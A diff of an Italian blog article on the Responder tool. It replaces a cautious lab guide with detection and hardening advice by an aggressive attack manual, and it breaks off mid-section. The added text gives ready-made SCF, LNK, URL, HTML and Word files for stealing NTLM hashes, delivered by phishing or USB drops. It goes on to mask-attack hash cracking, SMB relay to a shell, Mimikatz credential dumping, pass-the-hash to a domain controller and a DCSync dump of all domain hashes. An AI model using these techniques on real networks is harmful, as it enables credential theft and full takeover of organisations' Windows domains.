@@ -1,13 +1,7 @@
 ---
-title: >-
-  Responder: Attacco LLMNR, NBT-NS e WPAD in LAN per Rubare Hash NTLM come un
-  Vero Red Teamer
+title: 'Responder: Manuale Pratico per Cattura Hash NTLM e SMB Authentication Attack'
 slug: responder
-description: >-
-  Scopri come un attaccante può sfruttare protocolli deboli come LLMNR, NBT-NS e
-  WPAD per rubare credenziali di rete usando Responder e MultiRelay. Una guida
-  completa e realistica per chi fa pentesting interno o vuole capire davvero
-  come funzionano gli attacchi alle LAN Windows.
+description: 'Scopri come un attaccante può sfruttare protocolli deboli come LLMNR, NBT-NS e WPAD per rubare credenziali di rete usando Responder e MultiRelay. Una guida completa e realistica per chi fa pentesting interno o vuole capire davvero come funzionano gli attacchi alle LAN Windows.'
 image: /responder.webp
 draft: false
 date: 2026-01-22T00:00:00.000Z
@@ -20,505 +14,993 @@ tags:
   - mitm
 ---
 
-# Responder: Attacco LLMNR, NBT-NS e WPAD in LAN per Rubare Hash NTLM come un Vero Red Teamer
+# Responder: Manuale Pratico per Cattura Hash NTLM e SMB Authentication Attack
 
-Se in un lab AD “spariscono” share e nomi host, Responder ti fa vedere chi sta chiedendo cosa e quando una macchina Windows cade su fallback insicuri, con output verificabile nei log.
+Responder è il tool che trasforma errori banali degli utenti in accessi privilegiati ai sistemi. In questa guida vedrai tecniche pratiche utilizzate in CTF, penetration test reali e red team operation per forzare sistemi Windows a consegnarti le loro credenziali senza che nessuno se ne accorga.
 
-## Intro
+Dimentica la teoria accademica: qui impari a costringere una macchina Windows a connettersi al tuo Kali, catturare l'hash NTLM in pochi secondi, e usarlo per compromettere l'intera rete. Tecniche che funzionano oggi, su Windows 11, in ambienti enterprise reali.
 
-Responder è un tool che risponde ai fallimenti di risoluzione nomi (LLMNR/NBT-NS/MDNS) e presenta servizi fasulli (SMB/HTTP/LDAP ecc.) per catturare tentativi di autenticazione in LAN.
+## Setup Lab Pratico: Dal Nulla a Compromissione
 
-In pentest interno “da lab” serve per validare una classe di debolezze: fallback legacy + auto-discovery (es. WPAD) + NTLM.
+### Ambiente di Test
 
-Cosa farai/imparerai:
+**Attacker Machine (Kali Linux):**
 
-* capire quando usare modalità passiva vs attiva
-* avviare Responder sul segmento giusto senza “spararti sui piedi”
-* leggere e interpretare i log (hash/credenziali catturate)
-* riconoscere segnali di detection e applicare hardening
+* IP: 192.168.1.100
+* Tool: Responder, John the Ripper, Hashcat
 
-Nota etica: usa queste tecniche solo su lab/CTF/HTB/PG o sistemi di tua proprietà con autorizzazione esplicita.
+**Target Machine (Windows 10/11):**
 
-## Cos’è Responder e dove si incastra nel workflow
+* IP: 192.168.1.50
+* User: hacker / Password123!
+* Membro di: WORKGROUP (o dominio CORP.LOCAL)
 
-> **In breve:** Responder ti aiuta a osservare o sfruttare fallback di name resolution e servizi rogue per catturare autenticazioni in una LAN di lab; è un “sensore offensivo” che produce prove nei log.
+**Obiettivo:** Catturare hash NTLM dell'utente senza che si accorga di nulla.
 
-Responder ha senso quando:
-
-* sei “dentro” una rete di lab e vuoi capire il rumore LLMNR/NBNS/MDNS
-* vuoi dimostrare in modo ripetibile che le macchine tentano NTLM verso risposte non affidabili
-* vuoi generare evidenza per hardening (disabilitare LLMNR/NBNS/WPAD, rafforzare SMB signing, ecc.)
-
-Se dopo la cattura ottieni credenziali, il passo successivo nel workflow è la fase “post-creds” (enumerazione AD, permessi, percorsi di attacco). Per quella parte, come pillar del cluster, vedi BloodHound: mappa l’Active Directory come un hacker: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)
-
-Quando NON usarlo:
-
-* su reti reali non autorizzate (anche solo “ascoltare” può impattare)
-* su segmenti dove non controlli DHCP/DNS o dove potresti interferire con device critici
-
-## Installazione / verifica versione / quick sanity check
-
-> **In breve:** usa la repo ufficiale per avere feature aggiornate; verifica subito che `Responder.py --help` funzioni e che l’interfaccia di rete sia corretta.
-
-Perché: installare in modo pulito evita problemi di dipendenze e opzioni “mancanti”.
-Cosa aspettarti: una directory `Responder/` con `Responder.py`, `Responder.conf` e cartella `logs/`.
-Comando:
+### Installazione Rapida Responder
 
 ```bash
-sudo apt-get update
-sudo apt-get install python3 python3-pip python3-netifaces
-git clone https://github.com/lgandx/Responder.git
+cd /opt
+sudo git clone https://github.com/lgandx/Responder.git
 cd Responder
-pip3 install -r requirements.txt
-sudo python3 Responder.py --help
-```
-
-Esempio di output (può variare):
-
-```text
-Responder 3.x
-Usage: Responder.py -I <iface> [options]
- -I, --interface=eth0   Network interface to use
- -A                    Analyze mode
- ...
-```
-
-Interpretazione: se vedi usage e opzioni principali, sei pronto.
-Errore comune + fix: `Permission denied` → avvia con `sudo`; `python not found` → usa `python3`.
-
-Perché: scegliere l’interfaccia giusta è metà del successo.
-Cosa aspettarti: output con `eth0/wlan0` e indirizzo IP della tua macchina di lab.
-Comando:
-
-```bash
-ip -br a
-```
-
-Esempio di output (può variare):
-
-```text
-lo               UNKNOWN        127.0.0.1/8 ::1/128
-eth0             UP             10.10.10.50/24 fe80::1234/64
-```
-
-Interpretazione: qui l’interfaccia utile è `eth0`.
-Errore comune + fix: usare l’interfaccia sbagliata → non vedi traffico, non catturi nulla.
-
-## Modalità Analyze: prima ascolta, poi decidi
-
-> **In breve:** in analyze mode Responder monitora passivamente: ottimo per capire se LLMNR/NBNS/MDNS sono davvero “vivi” nel tuo lab prima di avvelenare.
-
-Perché: riduci impatto e fai un “reality check” sulla rete.
-Cosa aspettarti: eventi di richieste nome e tentativi, senza risposte attive.
-Comando:
-
-```bash
-sudo python3 Responder.py -I eth0 -A -v
-```
-
-Esempio di output (può variare):
-
-```text
-[Analyze] LLMNR query from 10.10.10.25 for FILESERVER01
-[Analyze] NBT-NS query from 10.10.10.31 for WPAD
-```
-
-Interpretazione: stai vedendo chi chiede cosa; è il segnale che il fallback è attivo.
-Errore comune + fix: “silenzio totale” → sei sul segmento sbagliato o il lab ha LLMNR/NBNS disabilitati.
-
-Validation in lab: conferma con un client Windows di lab che un nome non risolvibile generi query (es. share digitata male).
-Segnali di detection: traffico UDP 5355/137 e richieste WPAD “anomale”.
-Hardening: disabilita LLMNR e NBT-NS dove possibile e rimuovi WPAD automatico.
-
-## Poisoning controllato: avvio base e cosa cambia davvero
-
-> **In breve:** l’avvio “base” abilita poisoning LLMNR/NBT-NS/MDNS secondo config e fa partire i server rogue necessari a catturare autenticazioni.
-
-Perché: passare da osservare a validare con prove (log) la debolezza.
-Cosa aspettarti: Responder “ascolta e risponde” alle richieste, e registra eventi in `logs/`.
-Comando:
-
-```bash
 sudo python3 Responder.py -I eth0 -v
 ```
 
-Esempio di output (può variare):
+Sei già in ascolto. Ora devi solo far connettere la vittima a te.
 
-```text
-[+] Poisoners:
-    LLMNR  [ON]
-    NBTNS  [ON]
-    MDNS   [ON]
-[+] Servers:
-    SMB    [ON]
-    HTTP   [ON]
-[+] Listening for events...
-```
+## Tecnica #1: Forced SMB Connection via UNC Path
 
-Interpretazione: poisoning e server principali sono attivi; ora attendi trigger dal lab.
-Errore comune + fix: avvio ok ma nessuna cattura → spesso non c’è traffico “triggerante” o i client non fanno fallback.
+### Scenario CTF Classico
 
-Validation in lab: da un Windows di lab prova un UNC verso host inesistente (es. `\\NOEXIST\share`) e verifica che compaia un tentativo.
-Segnali di detection: spike di risposte LLMNR/NBNS dal tuo IP, e SMB/HTTP inbound verso il tuo host.
-Hardening: disabilita LLMNR/NBNS, forza DNS corretto, blocca/gestisci WPAD, e richiedi SMB signing.
+Hai accesso fisico a una macchina Windows (magari un PC in reception) oppure puoi inviare un messaggio a un utente. Vuoi che Windows si connetta automaticamente al tuo Kali e ti passi l'hash.
 
-## Responder.conf: cosa accendere e cosa spegnere (rumore vs valore)
+### Metodo 1: Barra Indirizzi Explorer
 
-> **In breve:** Responder è potente perché ha molti “rogue servers”; nel lab conviene minimizzare rumore e attivare solo ciò che vuoi misurare.
+**Sulla macchina Windows vittima:**
 
-Perché: più servizi rogue attivi = più superficie e più falsi positivi nel lab.
-Cosa aspettarti: un file `Responder.conf` con toggle per core e server.
-Comando:
+1. Apri Windows Explorer (Win+E)
+2. Nella barra indirizzi digita:
+   \192.168.1.100\share
+3. Premi INVIO
+
+**Cosa succede:**
+
+* Windows tenta di connettersi via SMB al tuo IP
+* Non trova share reale, ma NON importa
+* Prima ancora di verificare se lo share esiste, Windows si **autentica**
+* Responder cattura l'hash durante l'autenticazione
+
+**Output su Responder (Kali):**
 
 ```bash
-grep -n "Responder Core" -n Responder.conf
+[SMB] NTLMv2-SSP Client   : 192.168.1.50
+[SMB] NTLMv2-SSP Username : WORKGROUP\hacker
+[SMB] NTLMv2-SSP Hash     : hacker::WORKGROUP:1122334455667788:A4F2D8B9E3C7A1F6...
 ```
 
-Esempio di output (può variare):
+**Boom!** Hash catturato in 2 secondi.
 
-```text
+### Metodo 2: Comando CMD/PowerShell
+
+**Sulla vittima, da prompt:**
+
+```cmd
+dir \\192.168.1.100\test
+```
+
+Oppure:
+
+```powershell
+ls \\192.168.1.100\share
+```
+
+Risultato identico: Windows prova a connettersi, si autentica, Responder cattura.
+
+**Variante più stealth:**
+
+```cmd
+net use \\192.168.1.100\IPC$
+```
+
+Questo comando è meno sospetto perché IPC$ è uno share amministrativo standard.
+
+### Metodo 3: File SCF Injection (Tecnica Avanzata)
+
+Crea un file `.scf` (Shell Command File) che forza connessione automatica quando l'utente apre una cartella.
+
+**Crea `@stealth.scf`:**
+
+```ini
+[Shell]
+Command=2
+IconFile=\\192.168.1.100\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+**Come funziona:**
+
+1. Piazzi questo file in una share SMB accessibile (es. cartella condivisa aziendale)
+2. Quando un utente apre quella cartella con Explorer, Windows tenta di caricare `icon.ico`
+3. Per farlo, si connette al tuo IP Kali
+4. **Autentica automaticamente** senza che l'utente clicchi nulla
+5. Responder cattura hash
+
+**Deployment:**
+
+```bash
+# Sul Kali, crea il file
+echo '[Shell]
+Command=2  
+IconFile=\\192.168.1.100\share\test.ico
+[Taskbar]
+Command=ToggleDesktop' > @legit.scf
+
+# Carica su share accessibile o via USB drop
+```
+
+Ogni utente che apre quella cartella ti regala il suo hash. **Zero-click attack.**
+
+## Tecnica #2: Poisoning LLMNR/NBT-NS Automatico
+
+### Scenario Reale
+
+Sei sulla rete aziendale (post-exploitation, pivot da altra macchina, o anche solo connesso come ospite Wi-Fi). Vuoi catturare hash passivamente senza interazione.
+
+### Setup Responder Completo
+
+```bash
+cd /opt/Responder
+sudo python3 Responder.py -I eth0 -wrf
+```
+
+**Parametri spiegati:**
+
+* `-w` = abilita WPAD (Web Proxy Auto-Discovery)
+* `-r` = risponde a richieste LLMNR
+* `-f` = forza autenticazione NTLM sui fake server
+
+### Trigger Automatici Comuni
+
+**1. Utente digita male un percorso:**
+
+```
+\\filesrv\docs    →  corretto
+\\filesrvv\docs   →  sbagliato → LLMNR query → Responder cattura
+```
+
+**2. Browser cerca proxy WPAD:**
+
+```
+Internet Explorer all'avvio → cerca wpad.dat → LLMNR query "wpad" → Responder risponde → cattura hash
+```
+
+**3. Chrome risolve hostname random:**
+
+```
+Chrome fa 3 query DNS random all'avvio → falliscono → LLMNR fallback → Responder intercetta
+```
+
+**4. Applicazioni cercano risorse inesistenti:**
+
+```
+Software mal configurato cerca \\printserver\queue → non esiste → LLMNR → Responder
+```
+
+### Cattura Multipla
+
+Lascia Responder in esecuzione 30 minuti in una rete enterprise. Raccoglierai:
+
+```bash
+ls -lh logs/
+-rw-r--r-- 1 root root  1.2K HTTP-NTLMv2-192.168.1.15.txt
+-rw-r--r-- 1 root root  1.1K SMB-NTLMv2-SSP-192.168.1.22.txt
+-rw-r--r-- 1 root root  1.3K SMB-NTLMv2-SSP-192.168.1.31.txt
+-rw-r--r-- 1 root root   896 FTP-192.168.1.45.txt
+-rw-r--r-- 1 root root  1.2K SMB-NTLMv2-SSP-192.168.1.50.txt
+```
+
+**5 utenti diversi**, 5 hash catturati, zero interazione.
+
+## Tecnica #3: HTML/Office File Injection
+
+### Attacco via Email Phishing
+
+Crei un documento Word o HTML che forza connessione SMB quando aperto.
+
+### File HTML Weaponizzato
+
+**Crea `report.html`:**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Q4 Report</title>
+</head>
+<body>
+    <h1>Quarterly Sales Report</h1>
+    <img src="\\192.168.1.100\share\logo.png" alt="Logo">
+    <p>Loading data...</p>
+</body>
+</html>
+```
+
+**Cosa succede:**
+
+1. Utente apre `report.html` con browser o doppio click
+2. Browser tenta di caricare immagine da UNC path `\\192.168.1.100\share\logo.png`
+3. Windows autentica per accedere allo share
+4. Responder cattura hash
+
+**Variante stealth con iframe invisibile:**
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Document Preview</h1>
+    <iframe src="file://192.168.1.100/share/data.txt" style="display:none;"></iframe>
+</body>
+</html>
+```
+
+### File Word Weaponizzato (.docx)
+
+Inserisci immagine remota collegata:
+
+1. Apri Word → Inserisci → Immagine → Da file
+2. Nel campo filename digita: `\\192.168.1.100\share\image.jpg`
+3. Word memorizza questo path nel documento
+4. Salva come `Invoice.docx`
+
+**Quando la vittima apre Invoice.docx:**
+
+* Word tenta di caricare l'immagine remota
+* Si connette via SMB al tuo IP
+* Autentica automaticamente
+* **Hash catturato senza click**
+
+### PDF Weaponizzato
+
+Anche i PDF possono forzare connessioni SMB:
+
+```bash
+# Usa metadati PDF per embedded link
+exiftool -Creator='\\192.168.1.100\share' document.pdf
+```
+
+Quando Adobe Reader tenta di verificare il Creator, può triggare connessione.
+
+## Tecnica #4: Shortcut (LNK) File Attack
+
+### LNK Poisoning
+
+I file `.lnk` (collegamenti Windows) possono forzare autenticazioni.
+
+**Crea shortcut malevolo:**
+
+1. **Con PowerShell:**
+
+```powershell
+$path = "C:\Users\Public\Documents\Important.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($path)
+$Shortcut.TargetPath = "\\192.168.1.100\share\file.txt"
+$Shortcut.IconLocation = "\\192.168.1.100\share\icon.ico"
+$Shortcut.Save()
+```
+
+1. **Deployment:**
+   * Piazza su USB drive
+   * Carica su share di rete
+   * Invia via email (zippato per evitare detection)
+
+**Quando utente:**
+
+* Naviga nella cartella con Explorer → Windows mostra anteprima → tenta di caricare icona → autentica → hash catturato
+* Doppio-click sul file → stessa cosa
+
+**Zero click se Explorer ha preview abilitato** (default su Windows 10/11).
+
+## Tecnica #5: URL File Injection
+
+### File URL Weaponizzato
+
+Crea `document.url`:
+
+```ini
+[InternetShortcut]
+URL=file://192.168.1.100/share/data.txt
+```
+
+Salva come `document.url` e distribuisci.
+
+**Quando aperto:**
+
+1. Windows tenta di aprire il file via UNC path
+2. Autentica al tuo Responder
+3. Hash catturato
+
+**Variante con icona custom:**
+
+```ini
+[InternetShortcut]
+URL=http://www.google.com
+IconFile=\\192.168.1.100\share\favicon.ico
+IconIndex=0
+```
+
+Sembra un link a Google, ma l'icona forza connessione SMB.
+
+## Tecnica #6: WPAD Attack in Rete Aziendale
+
+### Forcing Browser Authentication
+
+Molti ambienti enterprise hanno WPAD configurato male o non configurato affatto. Browser cercano automaticamente configurazione proxy.
+
+### Attacco WPAD Completo
+
+**Setup Responder:**
+
+```bash
+sudo python3 Responder.py -I eth0 -wFb
+```
+
+**Parametri critici:**
+
+* `-w` = abilita rogue WPAD proxy
+* `-F` = forza auth su richiesta wpad.dat
+* `-b` = usa Basic Auth invece di NTLM (password in chiaro!)
+
+**Cosa succede:**
+
+1. Browser vittima cerca `wpad.corp.local` via DNS → fallisce
+2. Fallback a LLMNR: cerca "wpad" via multicast
+3. Responder risponde: "Sì, sono io WPAD!"
+4. Browser: "Dammi il file wpad.dat"
+5. Responder: "Prima autenticati!"
+6. Browser passa credenziali utente
+7. **Hash (o password chiaro con -b) catturata**
+
+**Output Responder:**
+
+```bash
+[+] Listening for events...
+[LLMNR]  Poisoned answer sent to 192.168.1.25 for name wpad
+[HTTP] Sending NTLM authentication request to 192.168.1.25
+[HTTP] NTLMv2 Client   : 192.168.1.25
+[HTTP] NTLMv2 Username : CORP\john.doe  
+[HTTP] NTLMv2 Hash     : john.doe::CORP:1122334455667788:E8D3F1A9...
+```
+
+Per approfondimenti su protocolli di rete, vedi la [guida Netcat](https://hackita.it/articoli/netcat).
+
+## Cracking Hash: Tecniche Rapide
+
+### Preparazione Hash File
+
+```bash
+cd /opt/Responder/logs
+cat SMB-NTLMv2-SSP-*.txt > all_hashes.txt
+```
+
+### Cracking con John the Ripper
+
+**Attacco dizionario base:**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt all_hashes.txt
+```
+
+**Con regole per aumentare efficacia:**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 all_hashes.txt
+```
+
+**Attacco con wordlist custom (azienda):**
+
+```bash
+# Crea wordlist da sito aziendale
+cewl -d 3 -m 6 https://targetcompany.com -w company_words.txt
+
+# Cracka con quella wordlist
+john --wordlist=company_words.txt --rules=KoreLogic all_hashes.txt
+```
+
+### Cracking con Hashcat (GPU)
+
+Molto più veloce se hai GPU dedicata:
+
+```bash
+# Identifica tipo hash (NetNTLMv2 = 5600)
+hashcat --example-hashes | grep -i ntlm
+
+# Attacco dizionario
+hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Attacco mask (password comune aziendale)
+hashcat -m 5600 all_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d!
+# Formato: Maiuscola + 4 minuscole + 4 numeri + !
+# Esempio: Admin2024!
+```
+
+**Pattern comuni password aziendali:**
+
+```bash
+# Estate2024!
+hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?d?d?d?d!
+
+# Benvenuto123
+hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?l?l?l?d?d?d
+
+# Company@2024
+hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?l@?d?d?d?d
+```
+
+### Visualizza Password Craccate
+
+```bash
+john --show all_hashes.txt
+```
+
+**Output:**
+
+```
+hacker::WORKGROUP:...:Password123!
+john.doe::CORP:...:Estate2024!
+admin::CORP:...:Benvenuto@2024
+
+3 password hashes cracked, 2 left
+```
+
+## SMB Relay Attack: Da Hash a Shell
+
+### Verifica Target Vulnerabili
+
+Prima di relay, verifica quali host hanno SMB signing disabilitato:
+
+```bash
+cd /opt/Responder/tools
+python3 RunFinger.py -i 192.168.1.0/24
+```
+
+**Output:**
+
+```
+[+] 192.168.1.10    DC01              SMB signing: True   [Domain Controller - SKIP]
+[+] 192.168.1.50    WKS-USER01        SMB signing: False  [VULNERABLE]
+[+] 192.168.1.51    WKS-USER02        SMB signing: False  [VULNERABLE]
+[+] 192.168.1.52    SRV-FILE01        SMB signing: True   [Protected]
+```
+
+Target: `192.168.1.50` e `192.168.1.51` sono vulnerabili.
+
+### Configurazione Responder per Relay
+
+Disabilita SMB e HTTP in Responder per lasciare porte a MultiRelay:
+
+```bash
+nano /opt/Responder/Responder.conf
+```
+
+**Modifica:**
+
+```ini
 [Responder Core]
-LLMNR = On
-NBTNS = On
-MDNS  = On
+SMB = Off
+HTTP = Off
+```
+
+### Esecuzione Attack
+
+**Terminal 1 - Responder:**
+
+```bash
+sudo python3 Responder.py -I eth0 -rv
+```
+
+**Terminal 2 - MultiRelay:**
+
+```bash
+cd /opt/Responder/tools
+sudo python3 MultiRelay.py -t 192.168.1.50 -u ALL
+```
+
+**Cosa accade:**
+
+1. Vittima (192.168.1.25) digita `\\filesrvv\docs` (typo)
+2. LLMNR query → Responder cattura
+3. Vittima si connette a Responder credendo sia filesrvv
+4. **Invece di loggare solo hash**, MultiRelay lo usa per autenticarsi a 192.168.1.50
+5. Se l'utente è admin su 192.168.1.50 → **SHELL!**
+
+**Output MultiRelay:**
+
+```bash
+[+] Received NTLMv2 from 192.168.1.25 (CORP\admin)
+[+] Relaying credentials to 192.168.1.50
+[+] SMB Session established on 192.168.1.50
+[+] Administrative access confirmed!
+[+] Dropping into shell...
+
+Microsoft Windows [Version 10.0.19045]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\admin
+
+C:\Windows\system32>hostname  
+WKS-USER01
+
+C:\Windows\system32>net user
+User accounts for \\WKS-USER01
+
+admin                    guest                    DefaultAccount
 ...
 ```
 
-Interpretazione: qui decidi se tenere MDNS, e quali server far partire.
-Errore comune + fix: cambiare config e non vedere differenze → riavvia Responder e verifica che stai editando il file corretto nella directory corrente.
+**Hai shell su macchina remota senza sapere password!**
 
-Se stai facendo un lab di MITM più ampio (ARP spoofing, routing, ecc.), Bettercap può diventare il “contesto” di rete su cui innesti Responder: [https://hackita.it/articoli/bettercap/](https://hackita.it/articoli/bettercap/)
+Per tecniche SMB avanzate, consulta la [guida smbclient](https://hackita.it/articoli/smbclient).
 
-## Catture: dove finiscono le prove e come leggerle
+## Privilege Escalation: Da User a Domain Admin
 
-> **In breve:** la tua “verità” è nei log: session log e file con hash/credenziali; se non salvi evidenza, non puoi riportare né hardening né detection.
+### Scenario Post-Shell
 
-Perché: in report conta la prova ripetibile (timestamp, IP, utente).
-Cosa aspettarti: un `Responder-Session.log` e file specifici per protocolli.
-Comando:
+Hai shell su `WKS-USER01` come `CORP\admin` (admin locale, NON domain admin).
 
-```bash
-tail -f logs/Responder-Session.log
-```
+### Dumping Credentials in Memoria
 
-Esempio di output (può variare):
-
-```text
-[SMB] NTLMv2-SSP Client   : 10.10.10.25
-[SMB] NTLMv2-SSP Username : CORP\jdoe
-[SMB] NTLMv2-SSP Hash     : jdoe::CORP:112233...:aabbcc...:010100...
-```
-
-Interpretazione: hai una cattura NetNTLMv2 (non password in chiaro), utile per dimostrare esposizione.
-Errore comune + fix: log vuoti → controlla che SMB/HTTP siano ON in config e che non ci sia firewall locale.
-
-Validation in lab: ripeti lo stesso trigger e verifica che l’evento ricompaia con stesso client/utente.
-Segnali di detection: autenticazioni NTLM verso host non attesi, richieste WPAD, e connessioni SMB verso IP “strano”.
-Hardening: riduci NTLM dove possibile, preferisci Kerberos, e applica policy di rete coerenti.
-
-Se dopo una cattura vuoi fare enumerazione “pulita” di directory (sempre in lab) con credenziali ottenute, collega qui Ldapsearch: enumerazione utenti e directory in attacco: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)
-
-## WPAD e proxy auth: quando è “troppo efficace” (e perché difendere)
-
-> **In breve:** WPAD può generare autenticazioni automatiche; in lab è ottimo per dimostrare rischio, ma va gestito con estrema cautela perché impatta la navigazione.
-
-Perché: WPAD spesso non richiede “errore umano”; basta auto-discovery attivo.
-Cosa aspettarti: richieste al nome `WPAD` e tentativi di autenticazione HTTP/proxy.
-Comando:
+**Opzione 1 - Mimikatz via MultiRelay:**
 
 ```bash
-sudo python3 Responder.py -I eth0 -Pvd
+C:\Windows\system32> mimi
 ```
 
-Esempio di output (può variare):
+Responder esegue Mimikatz embedded:
 
-```text
-[ProxyAuth] Listening on 3128
-[DHCP] Rogue DHCP enabled (lab only)
-[HTTP] WPAD request from 10.10.10.31
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 234567
+User Name         : john.doe
+Domain            : CORP
+NTLM              : 8c5d91e2f42ab3c5d76f9a1e4b2c8d3f
+
+Authentication Id : 0 ; 123456  
+User Name         : DA_Admin
+Domain            : CORP
+NTLM              : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
 ```
 
-Interpretazione: stai forzando un flusso proxy/WPAD nel lab; documenta impatto e spegni appena finito.
-Errore comune + fix: “internet rotto” nel lab → hai toccato l’auto-proxy; ripristina e isola sempre l’esperimento.
+**Boom!** Trovato `DA_Admin` (Domain Admin) loggato su questa workstation.
 
-Validation in lab: usa una VM Windows isolata con auto-proxy attivo e osserva richieste WPAD.
-Segnali di detection: richieste DNS/LLMNR per `wpad`, connessioni HTTP/proxy verso host inatteso.
-Hardening: disabilita WPAD automatico, crea record DNS/host controllati per wpad (in modo sicuro), e imposta proxy in modo esplicito.
+### Pass-the-Hash Lateral Movement
 
-Quando NON usarlo: se non puoi garantire isolamento del lab o se stai lavorando su un segmento “condiviso”.
-
-## Errori comuni e troubleshooting (quelli che ti fanno perdere 1 ora)
-
-> **In breve:** il 90% dei problemi è: permessi, interfaccia, porte occupate, firewall locale o assenza di trigger.
-
-Perché: diagnosi rapida = iterazioni rapide nel lab.
-Cosa aspettarti: identificare subito il collo di bottiglia.
-Comando:
+Ora hai hash di Domain Admin. Usa per autenticarti al Domain Controller:
 
 ```bash
-sudo netstat -tulpn | egrep ":(80|445|137|5355)\b"
+# Su Kali, usa hash per exec comandi su DC
+impacket-psexec -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 CORP/DA_Admin@192.168.1.10
 ```
 
-Esempio di output (può variare):
-
-```text
-tcp   LISTEN  0  128 0.0.0.0:445   ... smbd
-udp          0  0   0.0.0.0:137   ... nmbd
-```
-
-Interpretazione: se `smbd/nmbd` occupano porte, Responder non può bindare.
-Errore comune + fix: ferma i servizi locali (solo in lab):
+**Output:**
 
 ```bash
-sudo systemctl stop smbd nmbd
+Impacket v0.11.0 - Copyright 2023
+
+[*] Requesting shares on 192.168.1.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file...
+[*] Opening SVCManager on 192.168.1.10.....
+[*] Starting service...
+
+Microsoft Windows [Version 10.0.20348.1906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\da_admin
+
+C:\Windows\system32>hostname
+DC01
 ```
 
-Perché: vedere traffico ti dice se il problema è “rete” o “tool”.
-Cosa aspettarti: pacchetti LLMNR (5355) e NBNS (137) quando fai trigger.
-Comando:
+**Sei Domain Admin sul DC. Game Over. Rete compromessa.**
+
+### DCSync Attack
+
+Dumpa tutti gli hash del dominio:
 
 ```bash
-sudo tcpdump -ni eth0 udp port 5355 or udp port 137 or tcp port 445
+# Su Kali con credenziali DA
+impacket-secretsdump CORP/DA_Admin@192.168.1.10 -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
 ```
 
-Esempio di output (può variare):
+**Output:**
 
-```text
-IP 10.10.10.25.5355 > 224.0.0.252.5355: LLMNR query A FILESERVER01
-IP 10.10.10.25.49821 > 10.10.10.50.445: Flags [S] ...
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c34d55a5f6e4c8b2a1d8f3e7c5a9d2:::
+john.doe:1104:aad3b435b51404eeaad3b435b51404ee:8c5d91e2f42ab3c5d76f9a1e4b2c8d3f:::
+DA_Admin:1105:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
+...
 ```
 
-Interpretazione: se vedi query ma non catture, controlla config server rogue e firewall.
-Errore comune + fix: `iptables` blocca inbound → apri nel lab o disabilita temporaneamente la policy locale.
+**Hai TUTTI gli hash del dominio.** Accesso completo a ogni account.
 
-## Alternative e tool correlati (cluster pillar → spoke → child)
+## Tecniche Stealth e Anti-Detection
 
-> **In breve:** Responder non è l’unico; scegli tool alternativi in base a contesto (Windows-only, MITM più ampio, o pura discovery).
+### Modalità Analyze (Passive)
 
-Alternative “spoke” per poisoning su ambienti Windows: Inveigh (PowerShell/Windows) può essere più “nativo” nel lab: [https://hackita.it/articoli/inveigh/](https://hackita.it/articoli/inveigh/)
-
-Child per discovery NetBIOS prima del poisoning (riduce tentativi a vuoto): NBTScan può aiutarti a capire nomi e domini nel segmento: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)
-
-Child per proxy e ispezione HTTP(S) quando stai analizzando traffico applicativo (non LLMNR): Mitmproxy: [https://hackita.it/articoli/mitmproxy/](https://hackita.it/articoli/mitmproxy/)
-
-Nota di prioritizzazione interna (senza fuffa): usa BloodHound come pillar (visione AD), poi Responder/Inveigh come spoke (acquisizione), poi NBTScan/Bettercap/Mitmproxy come child (supporto).
-
-## Hardening & detection: cosa controllare dopo che “hai dimostrato” il problema
-
-> **In breve:** se Responder funziona in lab, la difesa è: spegnere fallback (LLMNR/NBT-NS/WPAD), ridurre NTLM, e rendere inutilizzabili certi relay con SMB signing e policy coerenti.
-
-Detection pratica:
-
-* monitora richieste LLMNR (UDP 5355) e NBNS (UDP 137) da client verso multicast/broadcast
-* allerta su query/connessioni verso `wpad` e su improvvisi proxy auto-config
-* segnala SMB/HTTP verso host non autorizzati (soprattutto se interno non “server”)
-
-Hardening pratico:
-
-* disabilita LLMNR e valuta l’impatto su ambienti legacy
-* disabilita WPAD/auto-proxy discovery dove non serve
-* richiedi SMB signing dove possibile, e preferisci Kerberos su NTLM
-
-Quando NON usarlo (difensivamente parlando): non “spegnere a caso” senza test; in ambienti legacy può emergere dipendenza reale da fallback.
-
-## Scenario pratico: Responder su una macchina HTB/PG
-
-> **In breve:** in un lab isolato, avvii Responder, provochi un fallback di name resolution e verifichi la cattura nei log, poi documenti detection e mitigazioni.
-
-Ambiente: attacker Kali `10.10.10.50`, victim Windows `10.10.10.10` (stessa /24).
-
-Obiettivo: dimostrare che la victim tenta NTLM verso servizi non affidabili quando DNS fallisce.
-
-Perché: attivare poisoning e raccogliere evidenza.
-Cosa aspettarti: Responder in ascolto e log di sessione popolato.
-Comando:
+Prima di attaccare, osserva la rete passivamente:
 
 ```bash
-sudo python3 Responder.py -I eth0 -v
